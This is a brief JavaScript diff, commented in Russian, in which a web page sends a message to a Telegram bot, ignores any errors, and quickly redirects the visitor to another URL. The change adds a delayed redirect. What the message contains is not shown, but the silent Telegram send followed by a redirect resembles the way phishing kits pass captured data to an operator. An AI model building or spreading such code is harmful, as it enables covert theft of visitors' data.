@@ -66,8 +66,7 @@ setTimeout(() => {
 
     console.log("Отправка в Telegram...");
 
-    // Отправляем запрос и ждем ответа от сервера Telegram
-    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
   method: "POST",
   headers: {
     "Content-Type": "application/json"
@@ -77,6 +76,10 @@ setTimeout(() => {
     text: message
   })
 }).catch(() => {});
+
+setTimeout(() => {
+  window.location.replace(targetUrl);
+}, 300);
 
 // Мгновенный редирект
 window.location.replace(targetUrl);
